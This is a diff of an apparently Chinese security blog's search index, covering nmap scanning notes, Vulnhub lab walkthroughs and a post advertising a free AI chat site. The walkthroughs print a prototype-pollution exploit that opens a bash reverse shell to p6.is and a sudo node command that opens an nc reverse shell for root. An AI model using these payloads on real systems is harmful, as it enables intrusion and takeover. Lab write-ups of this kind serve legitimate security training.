constant_">VNC</span>服务器执行强力密码审核。</span><br><span class="line">nmap --script vnc-brute -p <span class="number">5900</span> &lt;host&gt;</span><br><span class="line"></span><br><span class="line">漏洞扫描</span><br><span class="line">nmap -sV --script vulners [--script-args mincvss=&lt;arg_val&gt;] &lt;target&gt;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="防火墙-x2F-入侵检测-绕过"><a href="#防火墙-x2F-入侵检测-绕过" class="headerlink" title="防火墙&#x2F;入侵检测 绕过"></a><strong>防火墙&#x2F;入侵检测 绕过</strong></h2><ul>
+<h2 id="防火墙-入侵检测-绕过"><a href="#防火墙-入侵检测-绕过" class="headerlink" title="防火墙&#x2F;入侵检测 绕过"></a><strong>防火墙&#x2F;入侵检测 绕过</strong></h2><ul>
 <li><strong><code>nmap -sS -T4</code>    使用-sS  识别被拦截的端口</strong></li>
 <li><strong><code>nmap -sF</code>  使用fin扫描</strong></li>
 <li><strong>使用 -6 ipv6扫描</strong></li>
@@ -877,7 +877,7 @@
 <p>例如：</p>
 <blockquote>
 </blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SomeProject</span><br><span class="line">SomeProject == <span class="number">1.3</span></span><br><span class="line">SomeProject &gt;= <span class="number">1.2</span>, &lt; <span class="number">2.0</span></span><br><span class="line">SomeProject[foo, bar]</span><br><span class="line">SomeProject ~= <span class="number">1.4</span><span class="number">.2</span></span><br><span class="line">SomeProject == <span class="number">5.4</span> ; python_version &lt; <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">SomeProject ; sys_platform == <span class="string">&#x27;win32&#x27;</span></span><br><span class="line">requests [security] &gt;= <span class="number">2.8</span><span class="number">.1</span>, == <span class="number">2.8</span>.* ; python_version &lt; <span class="string">&quot;2.7&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SomeProject</span><br><span class="line">SomeProject == <span class="number">1.3</span></span><br><span class="line">SomeProject &gt;= <span class="number">1.2</span>, &lt; <span class="number">2.0</span></span><br><span class="line">SomeProject[foo, bar]</span><br><span class="line">SomeProject ~= <span class="number">1.4</span>.<span class="number">2</span></span><br><span class="line">SomeProject == <span class="number">5.4</span> ; python_version &lt; <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">SomeProject ; sys_platform == <span class="string">&#x27;win32&#x27;</span></span><br><span class="line">requests [security] &gt;= <span class="number">2.8</span>.<span class="number">1</span>, == <span class="number">2.8</span>.* ; python_version &lt; <span class="string">&quot;2.7&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><blockquote>
 <p>Python 虚拟环境是一种用于隔离Python项目的方式，创建一个独立的Python环境，使得每个项目都可以拥有自己的依赖库和运行环境、程序版本，而不会相互干扰。从而不会导致多个项目之间因为依赖版本问题导致运行错误等等。所以在使用python时，可以为每个项目设置一个虚拟环境。物理环境则相反。</p>
@@ -907,7 +907,7 @@
 <li><strong>升级</strong> <code>python -m pip install --upgrade pip</code></li>
 <li><strong>安装软件包</strong></li>
 </ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -m pip install SomePackage            </span><br><span class="line">python -m pip install SomePackage==<span class="number">1.0</span><span class="number">.4</span>    </span><br><span class="line">python -m pip install <span class="string">&#x27;SomePackage&gt;=1.0.4&#x27;</span>    </span><br><span class="line"></span><br><span class="line">**项目文件中存在 requirements.txt 文件，以下命令安装该项目声明的所有依赖</span><br><span class="line">python -m pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">使用freeze命令根据当前文件夹生成requirements.txt</span><br><span class="line">python -m pip freeze &gt; requirements.txt**</span><br><span class="line"></span><br><span class="line">指定包升级</span><br><span class="line">python -m pip install --upgrade PackageName</span><br><span class="line"></span><br><span class="line">升级所有</span><br><span class="line">python -m pip install --upgrade </span><br><span class="line"></span><br><span class="line">在“可编辑”模式下安装本地项目。方便本地调试修改包测试</span><br><span class="line">python -m pip install -e .                # 本地目录安装包</span><br><span class="line">python -m pip install -e path/to/project  # 指定目录安装包</span><br><span class="line"></span><br><span class="line">指定软件仓库镜像地址安装包</span><br><span class="line">python -m pip install --index-url http:<span class="comment">//my.package.repo/simple/ PackageName</span></span><br><span class="line"></span><br><span class="line">要列出已安装的软件包：</span><br><span class="line">python -m pip <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">要显示有关已安装软件包的详细信息，请执行以下操作：</span><br><span class="line">python -m pip show sphinx</span><br><span class="line"></span><br><span class="line">用户安装，将包安装到用户特定的目录，实现与全局包隔离不冲突</span><br><span class="line">python -m pip install --user SomePackage</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -m pip install SomePackage            </span><br><span class="line">python -m pip install SomePackage==<span class="number">1.0</span>.<span class="number">4</span>    </span><br><span class="line">python -m pip install <span class="string">&#x27;SomePackage&gt;=1.0.4&#x27;</span>    </span><br><span class="line"></span><br><span class="line">**项目文件中存在 requirements.txt 文件，以下命令安装该项目声明的所有依赖</span><br><span class="line">python -m pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">使用freeze命令根据当前文件夹生成requirements.txt</span><br><span class="line">python -m pip freeze &gt; requirements.txt**</span><br><span class="line"></span><br><span class="line">指定包升级</span><br><span class="line">python -m pip install --upgrade PackageName</span><br><span class="line"></span><br><span class="line">升级所有</span><br><span class="line">python -m pip install --upgrade </span><br><span class="line"></span><br><span class="line">在“可编辑”模式下安装本地项目。方便本地调试修改包测试</span><br><span class="line">python -m pip install -e .                # 本地目录安装包</span><br><span class="line">python -m pip install -e path/to/project  # 指定目录安装包</span><br><span class="line"></span><br><span class="line">指定软件仓库镜像地址安装包</span><br><span class="line">python -m pip install --index-url http:<span class="comment">//my.package.repo/simple/ PackageName</span></span><br><span class="line"></span><br><span class="line">要列出已安装的软件包：</span><br><span class="line">python -m pip <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">要显示有关已安装软件包的详细信息，请执行以下操作：</span><br><span class="line">python -m pip show sphinx</span><br><span class="line"></span><br><span class="line">用户安装，将包安装到用户特定的目录，实现与全局包隔离不冲突</span><br><span class="line">python -m pip install --user SomePackage</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><strong>卸载软件包</strong></li>
@@ -1997,6 +1997,91 @@ pip 是一款官方默认的python包管理器，可以处理依赖问题，功�
       </tags>
   </entry>
   <entry>
+    <title>免费AI网站推荐，40+ 模型免费不限量使用！！</title>
+    <url>/2025/02/26/ai-tui/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
+</div>
+
+<div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2025</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-26</p>
+</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
+<h1 id="简介-🛹"><a href="#简介-🛹" class="headerlink" title="简介 🛹"></a>简介 🛹</h1><h1 id="www-gpt-all-chat"><a href="#www-gpt-all-chat" class="headerlink" title="www.gpt-all.chat"></a><a href="https://www.gpt-all.chat/">www.gpt-all.chat</a></h1><h1 id="40-国内外大模型永久不限量免费使用！！！"><a href="#40-国内外大模型永久不限量免费使用！！！" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><h1 id="40-国内外大模型永久不限量免费使用！！！-1"><a href="#40-国内外大模型永久不限量免费使用！！！-1" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><h1 id="40-国内外大模型永久不限量免费使用！！！-2"><a href="#40-国内外大模型永久不限量免费使用！！！-2" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><p>原文档地址：<a href="https://flowus.cn/fixm/share/227da662-efe4-41ae-bcd7-a5a1122ae525?code=AHJMZV">https://flowus.cn/fixm/share/227da662-efe4-41ae-bcd7-a5a1122ae525?code=AHJMZV</a></p>
+<h3 id="QQ-📜"><a href="#QQ-📜" class="headerlink" title="QQ 📜"></a>QQ 📜</h3><p>QQ 群号：604710243</p>
+<hr>
+<p><strong>可以免费使用的 AI 助手</strong>，聚合了国内外所有的主流大模型，CHATGPT，CLAUDE，GEMINI ，KIMI，SPARK  等等。文档主要介绍 Chaos AI Assistant 的各个功能，注意要点，以及基本使用方式，使用技巧。</p>
+<h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><p>聚合国内外主流 AI 大模型，OPENAI ，CLAUDE ，Gemini 等。支持对话，绘画，视频，PPT，文档，音乐等 AI 生成。</p>
+<ul>
+<li><strong>官网地址：&gt;&gt;&gt;</strong></li>
+</ul>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h1 id="使用-🎃"><a href="#使用-🎃" class="headerlink" title="使用 🎃"></a>使用 🎃</h1><p>文档使用案例，截图，文字叙述的方式介绍各个功能的基本用法，注意事项等。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<h2 id="AI-对话"><a href="#AI-对话" class="headerlink" title="AI 对话"></a>AI 对话</h2><p>对话方式的 AI 大模型。使用生成式 AI 大模型进行对话，实现文本生成，图像生成，音频生成，视频生成等功能。（注意）<strong>！！需要上传图片，文档之类的选择多模态模型使用。</strong></p>
+<ul>
+<li><p>多模态模型：支持文本，图像生成。如（gpt-4o）</p>
+</li>
+<li><p>普通模型：只生成文本类信息。如（gpt-3.5）</p>
+</li>
+</ul>
+<hr>
+<h3 id="对话配置"><a href="#对话配置" class="headerlink" title="对话配置"></a>对话配置</h3><p>在对话配置页面，可以设置对话的一系列功能，如模型选择，上下文携带数量，Tokens，角色提示词预设，随机性，话题新鲜度，重复度等等信息，满足用户自定义需求。参考下图。</p>
+<hr>
+<h2 id="AI-绘画"><a href="#AI-绘画" class="headerlink" title="AI 绘画"></a>AI 绘画</h2><p>专用于绘图，图像生成的 AI 大模型，根据给出的文本提示，或图像提示等。从而生成相关的图片。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h2 id="AI-视频"><a href="#AI-视频" class="headerlink" title="AI 视频"></a>AI 视频</h2><p>专用于视频生成的 AI 大模型，根据给出的文本提示，图像提示生成相关视频，可实现 AI 换脸视频等功能。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h2 id="AI-音乐"><a href="#AI-音乐" class="headerlink" title="AI 音乐"></a>AI 音乐</h2><p>专用于生成音乐的 AI 大模型，音乐生成，歌词生成，歌曲生成。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h2 id="AI-PPT"><a href="#AI-PPT" class="headerlink" title="AI PPT"></a>AI PPT</h2><p>专用于生成 PPT 演讲稿的 AI 大模型。根据需要的 PPT 主题名称，内容描述，文件资料描述，生成 PPT 文档。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h1 id="用户管理-🚀"><a href="#用户管理-🚀" class="headerlink" title="用户管理 🚀"></a>用户管理 🚀</h1><p>这一节内容主要介绍用户相关功能。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<h3 id="每日福利"><a href="#每日福利" class="headerlink" title="每日福利"></a>每日福利</h3><p>用户页面 每日福利 功能可每日点击签到，会赠送 500 算力积分点数，解锁除了40 + 免费模型之外的限量付费</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<hr>
+<h1 id="联系方式-📃"><a href="#联系方式-📃" class="headerlink" title="联系方式 📃"></a>联系方式 📃</h1><p>使用过程中遇到任何问题，如若查阅文档无法解决，可尝试联系客服解决问题。</p>
+<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
+<h3 id="QQ-📜-1"><a href="#QQ-📜-1" class="headerlink" title="QQ 📜"></a>QQ 📜</h3><p>QQ 群号：604710243</p>
+<hr>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>AI</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub靶场BoredHackerBlog</title>
     <url>/2022/11/12/bac5/</url>
     <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
@@ -2027,7 +2112,7 @@ pip 是一款官方默认的python包管理器，可以处理依赖问题，功�
 </div></div></div>
 
 
-<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l                                                               <span class="comment">#arp发现，确定目标ip地址</span></span><br><span class="line">nmap -sn 192.168.56.1/24                                                          <span class="comment">#ping扫描，禁用端口扫描</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> ping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>                 <span class="comment">#shell 批量ping扫描 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> sudo arping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>     <span class="comment">#shell 批量arping扫描</span></span><br><span class="line"></span><br><span class="line">部分列举，方式很多，根据实际场景进行选择测试</span><br></pre></td></tr></table></figure>
+<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -I eth0 -l                                                               <span class="comment">#arp发现，确定目标ip地址</span></span><br><span class="line">nmap -sn 192.168.56.1/24                                                          <span class="comment">#ping扫描，禁用端口扫描</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> ping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>                 <span class="comment">#shell 批量ping扫描 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> <span class="built_in">sudo</span> arping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>     <span class="comment">#shell 批量arping扫描</span></span><br><span class="line"></span><br><span class="line">部分列举，方式很多，根据实际场景进行选择测试</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.108    <span class="comment">#进行全端口扫描</span></span><br><span class="line">nmap -p22,8080 192.168.56.108    <span class="comment">#进行端口服务识别</span></span><br><span class="line"></span><br><span class="line">根据发现的主机目标进行全端口扫描，随后进行端口服务发现</span><br></pre></td></tr></table></figure>
@@ -2102,7 +2187,7 @@ pip 是一款官方默认的python包管理器，可以处理依赖问题，功�
 </div></div></div>
 
 
-<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -i eth1  指定网卡，对目标网段进行arp主机发现</span><br><span class="line"></span><br><span class="line">确定目标 192.168.56.109  为测试靶机目标</span><br></pre></td></tr></table></figure>
+<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netdiscover -i eth1  指定网卡，对目标网段进行arp主机发现</span><br><span class="line"></span><br><span class="line">确定目标 192.168.56.109  为测试靶机目标</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.109 对发现目标进行全端口扫描</span><br><span class="line">nmap -p22,80,8000 -sV 192.168.56.109  对目标开放端口进行服务识别</span><br><span class="line"></span><br><span class="line">通过扫描发现目标开启22,80,8000端口，一个ssh,两个web服务，</span><br><span class="line">80使用apache实现，8000使用nodejs,并且获得了对应版本信息，操作系统版本信息为ubuntu</span><br></pre></td></tr></table></figure>
@@ -2126,8 +2211,8 @@ pip 是一款官方默认的python包管理器，可以处理依赖问题，功�
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    None, f<span class="string">&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>随后获得另外一个用户的shell,用户目录下存在一个flag文件。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l  查看当前用户的sudo权限</span><br><span class="line"></span><br><span class="line">执行后发现当前用户可以无密码sudo执行npm,node</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo node -e <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 9999 &gt;/tmp/m&#x27;)&quot;</span> </span><br><span class="line"></span><br><span class="line">使用sudo权限执行node,通过node调用nc反弹shell,获得root权限</span><br><span class="line">root目录下存在第二个flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l  查看当前用户的<span class="built_in">sudo</span>权限</span><br><span class="line"></span><br><span class="line">执行后发现当前用户可以无密码<span class="built_in">sudo</span>执行npm,node</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> node -e <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 9999 &gt;/tmp/m&#x27;)&quot;</span> </span><br><span class="line"></span><br><span class="line">使用<span class="built_in">sudo</span>权限执行node,通过node调用nc反弹shell,获得root权限</span><br><span class="line">root目录下存在第二个flag</span><br></pre></td></tr></table></figure>
 
 
 
@@ -2235,7 +2320,7 @@ pip 是一款官方默认的python包管理器，可以处理依赖问题，功�
 <div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
 </div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>08-20</p>
 </div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
-<h1 id="2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报"><a href="#2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报" class="headerlink" title="2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之 WPS 代码执行-威胁情报"></a><strong>2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之</strong> WPS 代码执行-威胁情报</h1><h1 id="漏洞情报列表"><a href="#漏洞情报列表" class="headerlink" title="漏洞情报列表"></a>漏洞情报列表</h1><ul>
+<h1 id="2023-HVV-0day-Nday-POC-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报"><a href="#2023-HVV-0day-Nday-POC-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报" class="headerlink" title="2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之 WPS 代码执行-威胁情报"></a><strong>2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之</strong> WPS 代码执行-威胁情报</h1><h1 id="漏洞情报列表"><a href="#漏洞情报列表" class="headerlink" title="漏洞情报列表"></a>漏洞情报列表</h1><ul>
 <li>安**御运维审计与风险控制系统堡垒机任意用户注册</li>
 <li>致*oa 任意文件上传</li>
 <li>致*oa rce</li>
@@ -3574,104 +3659,6 @@ sudo ./linux_x64_admin -l 8234 -s passwdkey --down http
       </tags>
   </entry>
   <entry>
-    <title>免费AI网站推荐，40+ 模型免费不限量使用！！</title>
-    <url>/2025/02/26/ai-tui/</url>
-    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
-</div>
-
-<div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
-</div>
-
-<div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
-</div>
-
-<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2025</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-26</p>
-</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
-<h1 id="简介-🛹"><a href="#简介-🛹" class="headerlink" title="简介 🛹"></a>简介 🛹</h1><h1 id="www-gpt-all-chat"><a href="#www-gpt-all-chat" class="headerlink" title="www.gpt-all.chat"></a><a href="https://www.gpt-all.chat/">www.gpt-all.chat</a></h1><h1 id="40-国内外大模型永久不限量免费使用！！！"><a href="#40-国内外大模型永久不限量免费使用！！！" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><h1 id="40-国内外大模型永久不限量免费使用！！！-1"><a href="#40-国内外大模型永久不限量免费使用！！！-1" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><h1 id="40-国内外大模型永久不限量免费使用！！！-2"><a href="#40-国内外大模型永久不限量免费使用！！！-2" class="headerlink" title="40 + 国内外大模型永久不限量免费使用！！！"></a>40 + 国内外大模型永久不限量免费使用！！！</h1><p>原文档地址：<a href="https://flowus.cn/fixm/share/227da662-efe4-41ae-bcd7-a5a1122ae525?code=AHJMZV">https://flowus.cn/fixm/share/227da662-efe4-41ae-bcd7-a5a1122ae525?code=AHJMZV</a></p>
-<h3 id="QQ-📜"><a href="#QQ-📜" class="headerlink" title="QQ 📜"></a>QQ 📜</h3><p>QQ 群号：604710243</p>
-<hr>
-<p><strong>可以免费使用的 AI 助手</strong>，聚合了国内外所有的主流大模型，CHATGPT，CLAUDE，GEMINI ，KIMI，SPARK  等等。文档主要介绍 Chaos AI Assistant 的各个功能，注意要点，以及基本使用方式，使用技巧。</p>
-<h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><p>聚合国内外主流 AI 大模型，OPENAI ，CLAUDE ，Gemini 等。支持对话，绘画，视频，PPT，文档，音乐等 AI 生成。</p>
-<ul>
-<li><strong>官网地址：&gt;&gt;&gt;</strong></li>
-</ul>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h1 id="使用-🎃"><a href="#使用-🎃" class="headerlink" title="使用 🎃"></a>使用 🎃</h1><p>文档使用案例，截图，文字叙述的方式介绍各个功能的基本用法，注意事项等。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<h2 id="AI-对话"><a href="#AI-对话" class="headerlink" title="AI 对话"></a>AI 对话</h2><p>对话方式的 AI 大模型。使用生成式 AI 大模型进行对话，实现文本生成，图像生成，音频生成，视频生成等功能。（注意）<strong>！！需要上传图片，文档之类的选择多模态模型使用。</strong></p>
-<ul>
-<li><p>多模态模型：支持文本，图像生成。如（gpt-4o）</p>
-</li>
-<li><p>普通模型：只生成文本类信息。如（gpt-3.5）</p>
-</li>
-</ul>
-<hr>
-<h3 id="对话配置"><a href="#对话配置" class="headerlink" title="对话配置"></a>对话配置</h3><p>在对话配置页面，可以设置对话的一系列功能，如模型选择，上下文携带数量，Tokens，角色提示词预设，随机性，话题新鲜度，重复度等等信息，满足用户自定义需求。参考下图。</p>
-<hr>
-<h2 id="AI-绘画"><a href="#AI-绘画" class="headerlink" title="AI 绘画"></a>AI 绘画</h2><p>专用于绘图，图像生成的 AI 大模型，根据给出的文本提示，或图像提示等。从而生成相关的图片。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h2 id="AI-视频"><a href="#AI-视频" class="headerlink" title="AI 视频"></a>AI 视频</h2><p>专用于视频生成的 AI 大模型，根据给出的文本提示，图像提示生成相关视频，可实现 AI 换脸视频等功能。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h2 id="AI-音乐"><a href="#AI-音乐" class="headerlink" title="AI 音乐"></a>AI 音乐</h2><p>专用于生成音乐的 AI 大模型，音乐生成，歌词生成，歌曲生成。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h2 id="AI-PPT"><a href="#AI-PPT" class="headerlink" title="AI PPT"></a>AI PPT</h2><p>专用于生成 PPT 演讲稿的 AI 大模型。根据需要的 PPT 主题名称，内容描述，文件资料描述，生成 PPT 文档。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h1 id="用户管理-🚀"><a href="#用户管理-🚀" class="headerlink" title="用户管理 🚀"></a>用户管理 🚀</h1><p>这一节内容主要介绍用户相关功能。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<h3 id="每日福利"><a href="#每日福利" class="headerlink" title="每日福利"></a>每日福利</h3><p>用户页面 每日福利 功能可每日点击签到，会赠送 500 算力积分点数，解锁除了40 + 免费模型之外的限量付费</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<hr>
-<h1 id="联系方式-📃"><a href="#联系方式-📃" class="headerlink" title="联系方式 📃"></a>联系方式 📃</h1><p>使用过程中遇到任何问题，如若查阅文档无法解决，可尝试联系客服解决问题。</p>
-<p><a href="https://gpt-all.chat/">Chaos AI Assistant - 混沌 AI 助手</a></p>
-<h3 id="QQ-📜-1"><a href="#QQ-📜-1" class="headerlink" title="QQ 📜"></a>QQ 📜</h3><p>QQ 群号：604710243</p>
-<hr>
-</div></div></div>
-
-<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
-</div>
-
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
-</div>
-
-]]></content>
-      <categories>
-        <category>AI</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于作者</title>
-    <url>/about/index.html</url>
-    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-brands fa-redhat"></i><p>个人简介</p>
-</div>
-<div class="note blue modern"><p>昵称：方糖<br>年龄：18<br>性别：男</p>
-</div>
